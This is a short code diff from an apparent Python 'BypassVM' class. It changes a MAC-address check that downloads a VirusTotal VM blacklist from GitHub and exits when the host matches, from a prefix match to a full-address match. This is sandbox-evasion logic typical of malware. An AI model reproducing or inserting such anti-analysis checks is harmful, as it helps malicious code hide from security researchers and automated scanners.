@@ -53,7 +53,7 @@ class BypassVM:
     def mac_check(self):
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
-        if mac_address[:8] in mac_list:
+        if mac_address in mac_list:
             print("VMware MAC Address Detected")
             sys.exit()
     def check_pc(self):
